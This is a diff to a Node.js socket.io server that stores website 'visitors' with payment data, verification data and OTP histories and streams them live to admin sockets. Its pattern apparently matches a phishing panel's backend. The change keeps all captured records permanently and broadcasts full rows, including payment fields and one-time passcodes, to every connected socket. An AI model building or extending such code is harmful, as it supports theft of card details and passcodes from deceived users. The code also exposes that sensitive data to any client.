@@ -379,15 +379,13 @@ io.on('connection', (socket) => {
   });
 
   // Handle live visitors request (جلب جميع الزوار حتى غير المتصلين)
+  // Handle visitors request - RETURN ALL VISITORS (online and offline)
   socket.on('visitors:request', async () => {
     try {
+      // IMPORTANT: Return ALL visitors including offline ones
+      // Data should NEVER be deleted, only marked as offline
       const visitors = await pool.query(`
-        SELECT session_id, ip_address, country, country_code, current_page, delivery_data, payment_data, 
-               verification_data, otp_history, form_submitted, payment_submitted, 
-               verification_submitted, last_activity, is_online
-        FROM visitors 
-        ORDER BY last_activity DESC
-        LIMIT 100
+        SELECT * FROM visitors ORDER BY is_online DESC, last_activity DESC LIMIT 100
       `);
 
       const responseData = { visitors: visitors.rows };
@@ -395,10 +393,10 @@ io.on('connection', (socket) => {
       // Send to requesting socket
       socket.emit('visitors:update', responseData);
       
-      // Also broadcast via io.emit so all connected sockets get updates
+      // Also broadcast via io.emit for reliability
       io.emit('visitors:update', responseData);
       
-      console.log('📡 visitors:request processed, sending to socket and broadcasting');
+      console.log('📡 visitors:request: returning', visitors.rows.length, 'visitors (including offline)');
     } catch (error) {
       console.error('Error fetching visitors:', error);
     }
@@ -494,7 +492,7 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Handle disconnect
+  // Handle disconnect - PERSIST DATA, ONLY MARK OFFLINE
   socket.on('disconnect', async () => {
     const client = connectedClients.get(socket.id);
     
@@ -505,18 +503,33 @@ io.on('connection', (socket) => {
         adminConnections.delete(socket.id);
       } else {
         try {
+          // IMPORTANT: Only mark as offline, DO NOT DELETE any data
           await pool.query(
-            'UPDATE visitors SET is_online = false WHERE session_id = $1',
+            'UPDATE visitors SET is_online = false, last_activity = CURRENT_TIMESTAMP WHERE session_id = $1',
             [client.sessionId]
           );
           
-          // Notify admins
-          adminConnections.forEach((adminSocket, socketId) => {
+          // Get full visitor data to broadcast
+          const visitorResult = await pool.query(
+            'SELECT * FROM visitors WHERE session_id = $1',
+            [client.sessionId]
+          );
+          
+          // Broadcast to ALL connected sockets via adminConnections
+          adminConnections.forEach((adminSocket) => {
             adminSocket.emit('visitor:offline', {
-              sessionId: client.sessionId,
+              ...visitorResult.rows[0],
               timestamp: new Date()
             });
           });
+          
+          // Also broadcast via io.emit for reliability
+          io.emit('visitor:offline', {
+            ...visitorResult.rows[0],
+            timestamp: new Date()
+          });
+          
+          console.log(`💾 Visitor ${client.sessionId} marked offline, data preserved`);
         } catch (error) {
           console.error('Error updating offline status:', error);
         }
